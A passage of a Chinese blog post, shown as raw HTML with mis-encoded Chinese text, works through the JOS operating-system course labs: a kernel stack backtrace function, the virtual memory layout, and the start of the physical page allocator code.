class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ backtrace ä¸­éœ€è¦æ³¨æ„çš„æ˜¯å…¶æä¾›çš„å‡½æ•°åæŒ‡é’ˆå¹¶éä»¥ <code>\0</code> ç»“å°¾æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æ‰‹åŠ¨æŒ‡å®šè¾“å‡ºé•¿åº¦ï¼Œæœ€ç»ˆ backtrace å‡½æ•°çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">mon_backtrace</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Your code here.</span></span><br><span class="line">    <span class="type">uint32_t</span> *old_ebp, last_eip;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">eipdebuginfo</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;movl %%ebp, %0;&quot;</span> : <span class="string">&quot;=r&quot;</span> (old_ebp))</span>;</span><br><span class="line">    cprintf(<span class="string">&quot;Stack backtrace:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (old_ebp)</span><br><span class="line">    &#123;</span><br><span class="line">        last_eip = old_ebp[<span class="number">1</span>];</span><br><span class="line">        debuginfo_eip(last_eip, &amp;eipdebuginfo);</span><br><span class="line">        cprintf(<span class="string">&quot;  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n&quot;</span>, </span><br><span class="line">            old_ebp, last_eip, old_ebp[<span class="number">2</span>], old_ebp[<span class="number">3</span>], old_ebp[<span class="number">4</span>], old_ebp[<span class="number">5</span>], old_ebp[<span class="number">6</span>]);</span><br><span class="line">        cprintf(<span class="string">&quot;         %s:%d: &quot;</span>, </span><br><span class="line">            eipdebuginfo.eip_file, eipdebuginfo.eip_line);</span><br><span class="line">        cprintf(<span class="string">&quot;%.*s+%d\n&quot;</span>,</span><br><span class="line">            eipdebuginfo.eip_fn_namelen, eipdebuginfo.eip_fn_name, last_eip - eipdebuginfo.eip_fn_addr);</span><br><span class="line">        old_ebp = (<span class="type">uint32_t</span> *) old_ebp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/02/21/3JksWlBiI7VNYEG.png" alt="imagepng"></p><p>è¿è¡Œ <code>make grade</code> ä»¥æ£€æŸ¥ lab 1 çš„å®Œæˆæƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸå®Œæˆäº† lab 1 çš„ä»£ç éƒ¨åˆ†ï¼Œè‡³æ­¤ï¼Œ lab 1 ç»“æŸ</p><p><img src="https://s2.loli.net/2022/02/21/GM57bwBngJP6UdO.png" alt="imagepng"></p><h1 id="0x02-Lab-2-Memory-Management"><a href="#0x02-Lab-2-Memory-Management" class="headerlink" title="0x02.Lab 2: Memory Management"></a>0x02.Lab 2: Memory Management</h1><p>åœ¨è¿™ä¸€éƒ¨åˆ†å½“ä¸­æˆ‘ä»¬éœ€è¦å®ç° OS kernel çš„<strong>å†…å­˜ç®¡ç†æ¨¡å—</strong>ï¼Œåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š</p><ul><li><p>ç‰©ç†å†…å­˜åˆ†é…å™¨ï¼šæˆ‘ä»¬éœ€è¦å°†æ‰€æœ‰çš„ç‰©ç†å†…å­˜ä»¥ã€Œé¡µã€ä¸ºå•ä½è¿›è¡Œç®¡ç†ï¼Œå¹¶è®°å½•ä¸‹å„ä¸ªé¡µçš„çŠ¶æ€ï¼ˆç©ºé—²æˆ–å·²è¢«åˆ†é…ï¼‰ã€å…±äº«è¯¥é¡µé¢çš„è¿›ç¨‹æ•°é‡ç­‰ï¼Œå¹¶å®ç°åˆ†é…ä¸é‡Šæ”¾ç‰©ç†é¡µçš„å‡½æ•°</p></li><li><p>è™šæ‹Ÿå†…å­˜åˆ†é…å™¨ï¼šæˆ‘ä»¬éœ€è¦å®Œæˆå¯¹é¡µè¡¨çš„ç®¡ç†ï¼Œä¸»è¦æ˜¯å®ç°è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„çš„å»ºç«‹åŠŸèƒ½</p></li></ul><p>é¦–å…ˆç”¨ git æ‹‰ lab2 çš„ä»£ç ä¸‹æ¥ï¼Œè¿™é‡Œç¬”è€…å‰é¢ lab 1 çš„ä»£ç æ²¡æœ‰ handin æ‰€ä»¥å‰é¢æç¤ºäº†ä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b lab2 origin/lab2</span></span><br><span class="line">M    kern/kdebug.c</span><br><span class="line">M    kern/monitor.c</span><br><span class="line">M    lib/printfmt.c</span><br><span class="line">Branch &#x27;lab2&#x27; set up to track remote branch &#x27;lab2&#x27; from &#x27;origin&#x27;.</span><br><span class="line">Switched to a new branch &#x27;lab2&#x27;</span><br></pre></td></tr></table></figure><p>lab 2 æ–°å¢äº†è¿™äº›æ–‡ä»¶ï¼š</p><ul><li>inc&#x2F;memlayout.h</li><li>kern&#x2F;pmap.c</li><li>kern&#x2F;pmap.h</li><li>kern&#x2F;kclock.h</li><li>kern&#x2F;kclock.c</li></ul><p><code>memlayout.h</code> ä¸­æè¿°äº†è™šæ‹Ÿåœ°å€ç©ºé—´çš„å¸ƒå±€ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ä¿®æ”¹ <code>pmap.c</code> æ¥å®ç°ï¼›åœ¨ <code>memlayout.h</code> ä¸ <code>pmap.h</code> ä¸­å®šä¹‰äº† <code>Pageinfo</code> ç»“æ„ä½“ï¼Œç”¨ä»¥æè¿°å•ä¸ªç‰©ç†é¡µï¼Œä¸ Linux å†…æ ¸çš„åšæ³•ç±»ä¼¼ï¼Œä¸€ä¸ª Pageinfo å¯¹åº”ä¸€å¼ ç‰©ç†é¡µï¼Œæ‰€ä»¥åœ¨è¯¥ç»“æ„ä½“ä¸­åªéœ€è¦å­˜å‚¨è¯¥é¡µçš„çŠ¶æ€å³å¯ï¼›<code>kclock.c</code> ä¸ <code>kclock.h</code> ç”¨ä»¥æ“ä½œç”µæ± åå¤‡æ—¶é’Ÿä¸ CMOS RAM ç¡¬ä»¶ï¼Œå…¶åœ¨ BIOS ä¸­è®°å½•äº† PC çš„ç‰©ç†å†…å­˜å®¹é‡ä¸å…¶ä»–ä¸œè¥¿ï¼Œåœ¨ <code>pmap.c</code> ä¸­çš„ä»£ç éœ€è¦è¯»å–è¯¥è®¾å¤‡ä»¥è®¡ç®—å¯ç”¨ç‰©ç†å†…å­˜ï¼Œè¿™éƒ¨åˆ†ä»£ç  xv6 å·²ç»å¸®æˆ‘ä»¬å®ç°å¥½äº†æ‰€ä»¥æˆ‘ä»¬æš‚æ—¶ä¸éœ€è¦äº†è§£ CMOS çš„åŸç†</p><blockquote><p> åœ¨ç¬”è€…çš„ <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/">ã€CODE.0x00ã€‘ä»é›¶å¼€å§‹çš„32ä½æ“ä½œç³»ç»Ÿå¼€å‘æ‰‹è®° - arttnba3â€™s blog</a> ä¸­è®°å½•äº†ä¸‰ç§è·å–å¯ç”¨ç‰©ç†å†…å­˜å®¹é‡ä¸å¸ƒå±€çš„æ–¹å¼ï¼ŒåŸå‹æ¥è‡ª Linux å†…æ ¸</p></blockquote><p>åœ¨ <code>memlayout.h</code> ä¸­å¯¹å°†è¦å»ºç«‹çš„å†…å­˜å¸ƒå±€æè¿°å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Virtual memory map:                                Permissions</span><br><span class="line"> *                                                    kernel/user</span><br><span class="line"> *</span><br><span class="line"> *    4 Gig --------&gt;  +------------------------------+</span><br><span class="line"> *                     |                              | RW/--</span><br><span class="line"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"> *                     :              .               :</span><br><span class="line"> *                     :              .               :</span><br><span class="line"> *                     :              .               :</span><br><span class="line"> *                     |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~| RW/--</span><br><span class="line"> *                     |                              | RW/--</span><br><span class="line"> *                     |   Remapped Physical Memory   | RW/--</span><br><span class="line"> *                     |                              | RW/--</span><br><span class="line"> *    KERNBASE, ----&gt;  +------------------------------+ 0xf0000000      --+</span><br><span class="line"> *    KSTACKTOP        |     CPU0&#x27;s Kernel Stack      | RW/--  KSTKSIZE   |</span><br><span class="line"> *                     | - - - - - - - - - - - - - - -|                   |</span><br><span class="line"> *                     |      Invalid Memory (*)      | --/--  KSTKGAP    |</span><br><span class="line"> *                     +------------------------------+                   |</span><br><span class="line"> *                     |     CPU1&#x27;s Kernel Stack      | RW/--  KSTKSIZE   |</span><br><span class="line"> *                     | - - - - - - - - - - - - - - -|                 PTSIZE</span><br><span class="line"> *                     |      Invalid Memory (*)      | --/--  KSTKGAP    |</span><br><span class="line"> *                     +------------------------------+                   |</span><br><span class="line"> *                     :              .               :                   |</span><br><span class="line"> *                     :              .               :                   |</span><br><span class="line"> *    MMIOLIM ------&gt;  +------------------------------+ 0xefc00000      --+</span><br><span class="line"> *                     |       Memory-mapped I/O      | RW/--  PTSIZE</span><br><span class="line"> * ULIM, MMIOBASE --&gt;  +------------------------------+ 0xef800000</span><br><span class="line"> *                     |  Cur. Page Table (User R-)   | R-/R-  PTSIZE</span><br><span class="line"> *    UVPT      ----&gt;  +------------------------------+ 0xef400000</span><br><span class="line"> *                     |          RO PAGES            | R-/R-  PTSIZE</span><br><span class="line"> *    UPAGES    ----&gt;  +------------------------------+ 0xef000000</span><br><span class="line"> *                     |           RO ENVS            | R-/R-  PTSIZE</span><br><span class="line"> * UTOP,UENVS ------&gt;  +------------------------------+ 0xeec00000</span><br><span class="line"> * UXSTACKTOP -/       |     User Exception Stack     | RW/RW  PGSIZE</span><br><span class="line"> *                     +------------------------------+ 0xeebff000</span><br><span class="line"> *                     |       Empty Memory (*)       | --/--  PGSIZE</span><br><span class="line"> *    USTACKTOP  ---&gt;  +------------------------------+ 0xeebfe000</span><br><span class="line"> *                     |      Normal User Stack       | RW/RW  PGSIZE</span><br><span class="line"> *                     +------------------------------+ 0xeebfd000</span><br><span class="line"> *                     |                              |</span><br><span class="line"> *                     |                              |</span><br><span class="line"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"> *                     .                              .</span><br><span class="line"> *                     .                              .</span><br><span class="line"> *                     .                              .</span><br><span class="line"> *                     |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|</span><br><span class="line"> *                     |     Program Data &amp; Heap      |</span><br><span class="line"> *    UTEXT --------&gt;  +------------------------------+ 0x00800000</span><br><span class="line"> *    PFTEMP -------&gt;  |       Empty Memory (*)       |        PTSIZE</span><br><span class="line"> *                     |                              |</span><br><span class="line"> *    UTEMP --------&gt;  +------------------------------+ 0x00400000      --+</span><br><span class="line"> *                     |       Empty Memory (*)       |                   |</span><br><span class="line"> *                     | - - - - - - - - - - - - - - -|                   |</span><br><span class="line"> *                     |  User STAB Data (optional)   |                 PTSIZE</span><br><span class="line"> *    USTABDATA ----&gt;  +------------------------------+ 0x00200000        |</span><br><span class="line"> *                     |       Empty Memory (*)       |                   |</span><br><span class="line"> *    0 ------------&gt;  +------------------------------+                 --+</span><br><span class="line"> *</span><br><span class="line"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="line"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="line"> *     there if desired.  JOS user programs map pages temporarily at UTEMP.</span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h2 id="Part-1-Physical-Page-Management"><a href="#Part-1-Physical-Page-Management" class="headerlink" title="Part 1: Physical Page Management"></a>Part 1: Physical Page Management</h2><p>æ“ä½œç³»ç»Ÿåº”å½“è¦ç®¡ç†å¥½å†…å­˜ä¸­çš„æ¯ä¸€å¼ å†…å­˜é¡µï¼ŒJOS åŒæ ·ä»¥é¡µä¸ºç²’åº¦è¿›è¡Œç®¡ç†ï¼Œåœ¨æœ¬éƒ¨åˆ†ä¸­æˆ‘ä»¬éœ€è¦ä¸º JOS ç¼–å†™ä¸€ä¸ªç‰©ç†å†…å­˜é¡µåˆ†é…å™¨ï¼Œå…¶ä½¿ç”¨ä¸€ä¸ªé“¾è¡¨æ¥å°†ç©ºé—²çš„ç‰©ç†é¡µå¯¹åº”çš„ Pageinfo ç»“æ„ä½“ç›¸è¿</p><p>åœ¨ Exercise 1 ä¸­è¦æ±‚æˆ‘ä»¬å®ç°è¯¥ç‰©ç†å†…å­˜é¡µåˆ†é…å™¨çš„å‡ ä¸ªå‡½æ•°</p><blockquote><p>Exercise 1.Â In the fileÂ kern&#x2F;pmap.c, you must implement code for the following functions (probably in the order given).</p><p><code>boot_alloc()</code><br><code>mem_init()</code>Â (only up to the call toÂ <code>check_page_free_list(1)</code>)<br><code>page_init()</code><br><code>page_alloc()</code><br><code>page_free()</code></p><p><code>check_page_free_list()</code>Â andÂ <code>check_page_alloc()</code>Â test your physical page allocator. You should boot JOS and see whetherÂ <code>check_page_alloc()</code>Â reports success. Fix your code so that it passes. You may find it helpful to add your ownÂ <code>assert()</code>s to verify that your assumptions are correct.</p></blockquote><p>ç¬”è€…æœ¬äººå¾ˆæƒ³ç›´æ¥å†™ä¸€ä¸ª buddy systemï¼ˆç¬‘ï¼‰ï¼Œä½†ä¸€æ˜¯æŠ€æœ¯åŠ›å¥½åƒä¸å¤§å¤Ÿçš„æ ·å­ï¼ŒäºŒæ˜¯åœ¨å¯¹ JOS æ²¡æœ‰è¶³å¤Ÿäº†è§£çš„æƒ…å†µä¸‹è¿˜æ˜¯å…ˆæŒ‰ç…§ç»™çš„æ³¨é‡Šæ¥å®ç°</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹ <code>kern/pmap.c</code> ï¼Œåœ¨ä¸€å¼€å¤´å£°æ˜äº†è¿™å‡ ä¸ªå…¨å±€å˜é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// These variables are set by i386_detect_memory()</span></span><br><span class="line"><span class="type">size_t</span> npages;<span class="comment">// Amount of physical memory (in pages)</span></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span> npages_basemem;<span class="comment">// Amount of base memory (in pages)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// These variables are set in mem_init()</span></span><br><span class="line"><span class="type">pde_t</span> *kern_pgdir;<span class="comment">// Kernel&#x27;s initial page directory</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pages</span>;</span><span class="comment">// Physical page state array</span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">page_free_list</span>;</span><span class="comment">// Free list of physical pages</span></span><br></pre></td></tr></table></figure><ul><li><code>npages</code>ï¼šä»¥é¡µä¸ºå•ä½çš„ç‰©ç†å†…å­˜æ€»é‡</li><li><code>npages_basemem</code>ï¼šä»¥é¡µä¸ºå•ä½çš„å¯ç”¨å†…å­˜æ€»é‡</li><li><code>kern_pgdir</code>ï¼šå†…æ ¸çš„é¡µå…¨å±€ç›®å½•è¡¨</li><li><code>pages</code>ï¼šé¡µç»“æ„ä½“ï¼ˆPageInfoï¼‰æ•°ç»„çš„æŒ‡é’ˆ</li><li><code>page_free_list</code>ï¼šç©ºé—²çš„ç‰©ç†é¡µå•å‘é“¾è¡¨å¤´èŠ‚ç‚¹</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥è¿™ä¸ªå†…å­˜ç®¡ç†æœ‰ç‚¹ç±»ä¼¼äº FLATMEM å†…å­˜æ¨¡å‹ï¼šç›´æ¥ç”±ä¸€ä¸ªå¤§çš„ page ç»“æ„ä½“æ•°ç»„å¯¹åº”ä¸€å—å¯ç”¨ç‰©ç†å†…å­˜åŒºåŸŸã€‚å†åŠ ä¸Š â€œåªæœ‰ä¸€ä¸ªå•å‘é“¾è¡¨çš„ buddy systemâ€ï¼Œå¤§æ¦‚å°±å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆç¬”è€…æ‹¿ä¸¤å¼ è®² Linuxçš„å›¾æ‹†å¼€æ‹¼æˆçš„ï¼‰</p><p><img src="https://s2.loli.net/2022/03/15/umCBxeDPFc7I23h.png" alt="JOSçš„å†…å­˜ç®¡ç†"></p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼š<strong>PageInfo ç»“æ„ä½“å¹¶ä¸éœ€è¦å­˜å‚¨åœ°å€ä¿¡æ¯ï¼Œå› ä¸ºä»–æ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ç›´æ¥å¯¹åº”æ•´ä¸ªç‰©ç†å†…å­˜ç©ºé—´</strong>ï¼Œç›¸åº”åœ°å°±æœ‰ pages[0] å¯¹åº”åœ°å€ 0ï¼Œpages[1] å¯¹åº”åœ°å€ 0x1000â€¦<strong>æˆ‘ä»¬å…¶å®å¾ˆå®¹æ˜“èƒ½å¾—åˆ° PageInfo åœ°å€åˆ°ç‰©ç†é¡µå¸§ä¹‹é—´çš„è½¬æ¢å…¬å¼</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹åœ¨ <code>kern/pmap.h</code> ä¸­å®ç°çš„ä¸¤ä¸ªè½¬æ¢å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">physaddr_t</span></span><br><span class="line"><span class="title function_">page2pa</span><span class="params">(<span class="keyword">struct</span> PageInfo *pp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (pp - pages) &lt;&lt; PGSHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> PageInfo*</span><br><span class="line"><span class="title function_">pa2page</span><span class="params">(<span class="type">physaddr_t</span> pa)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (PGNUM(pa) &gt;= npages)</span><br><span class="line">panic(<span class="string">&quot;pa2page called with invalid pa&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> &amp;pages[PGNUM(pa)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæˆ‘ä»¬ç°åœ¨æ‰€è¯´çš„éƒ½æ˜¯è™šæ‹Ÿåœ°å€ï¼Œæˆ‘ä»¬ä»éœ€è¦ä¸€ä¸ªè™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€ä¹‹é—´ç›´æ¥è½¬æ¢çš„å‡½æ•°ï¼Œå‚ç…§ä¸Šå›¾ï¼Œç”±äºæ˜¯çº¿æ€§æ˜ å°„ï¼Œæ•…ç›´æ¥å‡å»ä¸€ä¸ªå·®å€¼å³å¯ï¼Œåœ¨<code>kern/pmap.h</code> ä¸­ä¾¿å®ç°äº†è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€è½¬æ¢çš„å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This macro takes a kernel virtual address -- an address that points above</span></span><br><span class="line"><span class="comment"> * KERNBASE, where the machine&#x27;s maximum 256MB of physical memory is mapped --</span></span><br><span class="line"><span class="comment"> * and returns the corresponding physical address.  It panics if you pass it a</span></span><br><span class="line"><span class="comment"> * non-kernel virtual address.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PADDR(kva) _paddr(__FILE__, __LINE__, kva)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">physaddr_t</span></span><br><span class="line">_paddr(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">int</span> line, <span class="type">void</span> *kva)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">uint32_t</span>)kva &lt; KERNBASE)</span><br><span class="line">_panic(file, line, <span class="string">&quot;PADDR called with invalid kva %08lx&quot;</span>, kva);</span><br><span class="line"><span class="keyword">return</span> (<span class="type">physaddr_t</span>)kva - KERNBASE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹è¡¥å®Œ Exercise 1 çš„å‡ ä¸ªå‡½æ•°çš„ä»£ç äº†</p><h4 id="boot-alloc-ï¼šç‰©ç†å†…å­˜çº¿æ€§åˆ†é…å™¨"><a href="#boot-alloc-ï¼šç‰©ç†å†…å­˜çº¿æ€§åˆ†é…å™¨" class="headerlink" title="boot_alloc()ï¼šç‰©ç†å†…å­˜çº¿æ€§åˆ†é…å™¨"></a>boot_alloc()ï¼šç‰©ç†å†…å­˜çº¿æ€§åˆ†é…å™¨</h4><p>æŒ‰æƒ¯ä¾‹ï¼Œå…ˆçœ‹æ³¨é‡Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This simple physical memory allocator is used only while JOS is setting</span></span><br><span class="line"><span class="comment">// up its virtual memory system.  page_alloc() is the real allocator.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If n&gt;0, allocates enough pages of contiguous physical memory to hold &#x27;n&#x27;</span></span><br><span class="line"><span class="comment">// bytes.  Doesn&#x27;t initialize the memory.  Returns a kernel virtual address.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If n==0, returns the address of the next free page without allocating</span></span><br><span class="line"><span class="comment">// anything.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If we&#x27;re out of memory, boot_alloc should panic.</span></span><br><span class="line"><span class="comment">// This function may ONLY be used during initialization,</span></span><br><span class="line"><span class="comment">// before the page_free_list list has been set up.</span></span><br></pre></td></tr></table></figure><ul><li><p>è¯¥å‡½æ•°ä¸ºä¸€ä¸ªç®€æ˜“çš„ physical memory allocatorï¼Œ<strong>åªåœ¨ JOS å»ºç«‹å…¶è™šæ‹Ÿå†…å­˜ç³»ç»Ÿæ—¶ä½¿ç”¨</strong>ï¼Œç®—æ˜¯å†…æ ¸åˆå§‹åŒ–è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªä¸´æ—¶å‡½æ•°</p></li><li><p>å…¶åŠŸèƒ½ä¸»è¦æ˜¯è¿”å›ä»¥é¡µä¸ºå•ä½çš„è¿ç»­çš„ç‰©ç†å†…å­˜ç©ºé—´çš„è™šæ‹Ÿåœ°å€çš„èµ·å§‹åœ°å€ï¼Œnä¸º0æ—¶è¿”å›ä¸‹ä¸€ä¸ªç©ºé—²é¡µé¢ï¼ŒOOMæ—¶ panic</p></li></ul><p>æŒæ¡äº†è¿™äº›ä¿¡æ¯å°±å¯ä»¥å¼€å§‹å†™äº†ï¼Œå‡½æ•°ä¸€å¼€å¤´å®šä¹‰äº†ä¸€ä¸ª static çš„å˜é‡ <code>nextfree</code>ï¼Œè¡¨ç¤ºå…¶åˆ†é…æ–¹å¼æ˜¯ä»å†…å­˜ä¸€å¼€å§‹çº¿æ€§å¾€ååˆ‡å‰²çš„ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªè™šæ‹Ÿåœ°å€æ‰€ä»¥æˆ‘ä»¬åœ¨è®¡ç®—æ˜¯å¦ OOM æ—¶è¿˜éœ€è¦è½¬åŒ–æˆç‰©ç†åœ°å€ï¼Œå› ä¸ºé¢„è®¾é¡µè¡¨åªæ˜ å°„äº† 4MB å†…å­˜æ•…è¿™é‡Œè¶…å‡º 4MB æˆ‘ä»¬ç›´æ¥ OOM panicï¼›å¯¹é¡µå¤§å°çš„å¯¹é½ç›´æ¥ä½¿ç”¨ <code>ROUNDUP</code> å³å¯</p><blockquote><p>ROUNDUP æ˜¯ GCC çš„å®è¿˜æ˜¯ JOS çš„å®å‘¢ï¼Ÿæš‚ä¸”ä¸è€ƒè¯ï¼ˆå…¶å®æ˜¯æ²¡æ‰¾åˆ°ï¼‰ï¼Œè¿™é‡Œç›´æ¥â€œæ‹¿æ¥ä¸»ä¹‰â€</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">boot_alloc</span><span class="params">(<span class="type">uint32_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *nextfree;<span class="comment">// virtual address of next byte of free memory</span></span><br><span class="line"><span class="type">char</span> *result;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Initialize nextfree if this is the first time.</span></span><br><span class="line"><span class="comment">// &#x27;end&#x27; is a magic symbol automatically generated by the linker,</span></span><br><span class="line"><span class="comment">// which points to the end of the 